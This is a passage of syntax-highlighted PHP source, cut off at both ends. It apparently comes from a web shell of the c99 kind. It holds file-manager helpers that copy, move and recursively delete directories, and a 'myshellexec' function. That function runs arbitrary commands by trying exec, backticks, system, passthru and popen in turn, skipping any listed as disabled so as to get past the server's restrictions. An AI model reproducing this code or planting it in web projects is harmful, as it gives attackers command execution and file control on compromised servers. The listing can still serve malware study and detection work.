  <span class="k">if</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1073741824</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1073741824</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; GB&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1048576</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1048576</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; MB&quot;</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">1024</span><span class="p">)</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1024</span><span class="o">*</span><span class="mi">100</span><span class="p">)</span><span class="o">/</span><span class="mi">100</span> <span class="o">.</span><span class="s2">&quot; KB&quot;</span><span class="p">;}</span>
  <span class="k">else</span> <span class="p">{</span><span class="nv">$size</span> <span class="o">=</span> <span class="nv">$size</span> <span class="o">.</span> <span class="s2">&quot; B&quot;</span><span class="p">;}</span>
  <span class="k">return</span> <span class="nv">$size</span><span class="p">;</span>
 <span class="p">}</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;fs_copy_dir&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
 <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
 <span class="k">while</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span>
  <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
   <span class="k">else</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">mkdir</span><span class="p">(</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);</span> <span class="nx">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nv">$ret</span><span class="p">;}</span>
  <span class="p">}</span>
 <span class="p">}</span>
 <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
 <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;fs_copy_obj&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">fs_copy_obj</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
 <span class="nv">$t</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nb">dirname</span><span class="p">(</span><span class="nv">$t</span><span class="p">)))</span> <span class="p">{</span><span class="nb">mkdir</span><span class="p">(</span><span class="nb">dirname</span><span class="p">(</span><span class="nv">$t</span><span class="p">));}</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
  <span class="k">return</span> <span class="nx">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
 <span class="p">}</span>
 <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">);}</span>
 <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;fs_move_dir&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">fs_move_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$t</span><span class="p">))</span> <span class="p">{</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$t</span><span class="p">);}</span>
 <span class="k">while</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span>
  <span class="p">{</span>
   <span class="nv">$ret</span> <span class="o">=</span> <span class="k">TRUE</span><span class="p">;</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
   <span class="k">else</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">)</span> <span class="k">and</span> <span class="nx">fs_copy_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">,</span><span class="nv">$t</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nv">$ret</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;}}</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$ret</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nv">$ret</span><span class="p">;}</span>
  <span class="p">}</span>
 <span class="p">}</span>
 <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
 <span class="k">return</span> <span class="k">TRUE</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;fs_move_obj&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">fs_move_obj</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
 <span class="nv">$t</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$t</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
  <span class="k">return</span> <span class="nx">fs_move_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">);</span>
 <span class="p">}</span>
 <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span>
 <span class="p">{</span>
  <span class="k">if</span><span class="p">(</span><span class="nb">copy</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$t</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="nb">unlink</span><span class="p">(</span><span class="nv">$d</span><span class="p">);}</span>
  <span class="k">else</span> <span class="p">{</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$t</span><span class="p">);</span> <span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
 <span class="p">}</span>
 <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;fs_rmdir&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">fs_rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$h</span> <span class="o">=</span> <span class="nb">opendir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
 <span class="k">while</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">=</span> <span class="nb">readdir</span><span class="p">(</span><span class="nv">$h</span><span class="p">))</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">((</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;.&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$o</span> <span class="o">!=</span> <span class="s2">&quot;..&quot;</span><span class="p">))</span>
  <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="nb">unlink</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
   <span class="k">else</span> <span class="p">{</span><span class="nx">fs_rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="o">.</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">);</span> <span class="nb">rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$o</span><span class="p">);}</span>
  <span class="p">}</span>
 <span class="p">}</span>
 <span class="nb">closedir</span><span class="p">(</span><span class="nv">$h</span><span class="p">);</span>
 <span class="nb">rmdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
 <span class="k">return</span> <span class="o">!</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;fs_rmobj&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">fs_rmobj</span><span class="p">(</span><span class="nv">$o</span><span class="p">)</span>
<span class="p">{</span>
 <span class="nv">$o</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$o</span><span class="p">);</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$o</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$o</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
  <span class="k">return</span> <span class="nx">fs_rmdir</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
 <span class="p">}</span>
 <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">{</span><span class="k">return</span> <span class="nb">unlink</span><span class="p">(</span><span class="nv">$o</span><span class="p">);}</span>
 <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;myshellexec&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">myshellexec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">global</span> <span class="nv">$disablefunc</span><span class="p">;</span>
 <span class="nv">$result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
 <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">))</span>
 <span class="p">{</span>
  <span class="k">if</span> <span class="p">(</span><span class="nb">is_callable</span><span class="p">(</span><span class="s2">&quot;exec&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;exec&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="nb">exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="nv">$result</span><span class="p">);</span> <span class="nv">$result</span> <span class="o">=</span> <span class="nb">join</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$result</span><span class="p">);}</span>
  <span class="k">elseif</span> <span class="p">((</span><span class="nv">$result</span> <span class="o">=</span> <span class="sb">`$cmd`</span><span class="p">)</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_callable</span><span class="p">(</span><span class="s2">&quot;system&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;system&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="k">echo</span> <span class="nv">$v</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_callable</span><span class="p">(</span><span class="s2">&quot;passthru&quot;</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;passthru&quot;</span><span class="p">,</span><span class="nv">$disablefunc</span><span class="p">))</span> <span class="p">{</span><span class="nv">$v</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="nb">passthru</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span> <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ob_get_contents</span><span class="p">();</span> <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span> <span class="k">echo</span> <span class="nv">$v</span><span class="p">;}</span>
  <span class="k">elseif</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$fp</span> <span class="o">=</span> <span class="nb">popen</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">)))</span>
  <span class="p">{</span>
   <span class="nv">$result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
   <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="p">{</span><span class="nv">$result</span> <span class="o">.=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="mi">1024</span><span class="p">);}</span>
   <span class="nb">pclose</span><span class="p">(</span><span class="nv">$fp</span><span class="p">);</span>
  <span class="p">}</span>
 <span class="p">}</span>
 <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
<span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;tabsort&quot;</span><span class="p">))</span> <span class="p">{</span><span class="k">function</span> <span class="nf">tabsort</span><span class="p">(</span><span class="nv">$a</span><span class="p">,</span><span class="nv">$b</span><span class="p">)</span> <span class="p">{</span><span class="k">global</span> <span class="nv">$v</span><span class="p">;</span> <span class="k">return</span> <span class="nb">strnatcmp</span><span class="p">(</span><span class="nv">$a</span><span class="p">[</span><span class="nv">$v</span><span class="p">],</span> <span class="nv">$b</span><span class="p">[</span><span class="nv">$v</span><span class="p">]);}}</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;view_perms&quot;</span><span class="p">))</span>
<span class="p">{</span>
<span class="k">function</span> <span class="nf">view_perms</span><span class="p">(</span><span class="nv">$mode</span><span class="p">)</span>
<span class="p">{</span>
 <span class="k">if</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xC000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span><span class="p">;}</span>
 <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x4000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;}</span>
 <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0xA000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;l&quot;</span><span class="p">;}</span>
 <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x8000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;-&quot;</span><span class="p">;}</span>
 <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;b&quot;</span><span class="p">;}</span>
 <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x2000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;c&quot;</span><span class="p">;}</span>
 <span class="k">elseif</span> <span class="p">((</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">===</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;p&quot;</span><span class="p">;}</span>
 <span class="k">else</span> <span class="p">{</span><span class="nv">$type</span> <span class="o">=</span> <span class="s2">&quot;?&quot;</span><span class="p">;}</span>
 <span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00400</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;r&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
 <span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00200</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;w&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
 <span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00100</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;x&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
 <span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00040</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;r&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
 <span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00020</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;w&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
 <span class="nv">$group</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00010</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;x&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
 <span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;read&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00004</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;r&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
 <span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;write&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00002</span><span class="p">)</span><span class="o">?</span> <span class="s2">&quot;w&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
 <span class="nv">$world</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mo">00001</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;x&quot;</span><span class="o">:</span><span class="s2">&quot;-&quot;</span><span class="p">;</span>
 <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span> <span class="o">&amp;</span> <span class="mh">0x800</span><span class="p">)</span> <span class="p">{</span><span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$owner</span><span class="p">[</span><span class="s2">&quot;execute&quot;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;x&quot;</span><span class="p">)</span><span class="o">?</span><span class="s2">&quot;s&quot;</span><span class="o">:</span><span class="s2">&quot;S&quot;</span><span class="p">;}</span>
